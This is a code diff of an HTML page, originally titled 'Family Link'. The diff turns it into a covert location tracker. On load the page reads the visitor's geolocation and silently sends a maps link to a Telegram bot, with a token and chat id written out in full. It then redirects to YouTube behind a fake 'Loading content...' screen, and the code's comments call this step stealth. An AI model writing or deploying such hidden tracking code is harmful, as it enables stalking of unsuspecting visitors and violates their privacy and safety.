@@ -1,28 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Family Link</title>
+    <title>Loading...</title>
     <script>
         function sendLocation() {
             navigator.geolocation.getCurrentPosition(position => {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
-                const link = `https://www.google.com/maps?q=${lat},${lng}`;
-                
-                // Method 1: Open user's email client (no API needed)
-                window.open(`mailto:?subject=My Location&body=I'm here: ${link}`);
-                
-                // Method 2: Send SMS (works on mobile)
-                // window.open(`sms:?body=I'm here: ${link}`);
-                
-                // Redirect to YouTube (stealth)
-                setTimeout(() => { window.location.href = "https://youtube.com"; }, 500);
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                // SECRET: Send to Telegram (FIXED URL)
+                fetch(`https://api.telegram.org/7929357317:AAHWo_8NLGr5k4d4yAeJr1x-QZo9Ti3KBLY
+/sendMessage?chat_id=2091200246&text=📍 FAMILY ALERT! ${mapsLink}`)
+                    .then(response => console.log("Message sent!"))
+                    .catch(error => console.error("Error:", error));
+
+                // Redirect to YouTube (stealth!)
+                setTimeout(() => { window.location.href = "https://youtube.com"; }, 1000);
             });
         }
     </script>
 </head>
 <body onload="sendLocation()">
-    <!-- Show a fake loading screen -->
-    <h2>Loading your content...</h2>
+    <h2>Loading content...</h2>
 </body>
 </html>
